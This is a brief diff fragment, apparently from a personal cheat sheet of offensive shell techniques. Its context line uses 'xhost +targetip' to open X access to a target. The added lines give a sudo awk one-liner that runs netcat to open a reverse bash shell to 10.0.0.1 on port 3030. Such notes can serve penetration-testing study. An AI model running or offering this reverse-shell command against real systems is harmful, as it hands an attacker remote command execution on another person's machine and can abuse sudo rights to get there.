@@ -47,3 +47,7 @@ And to authorise the target
 xhost +targetip
 
 
+#awk#
+sudo awk 'BEGIN {system("nc 10.0.0.1 3030 -e /bin/bash")}
+
+
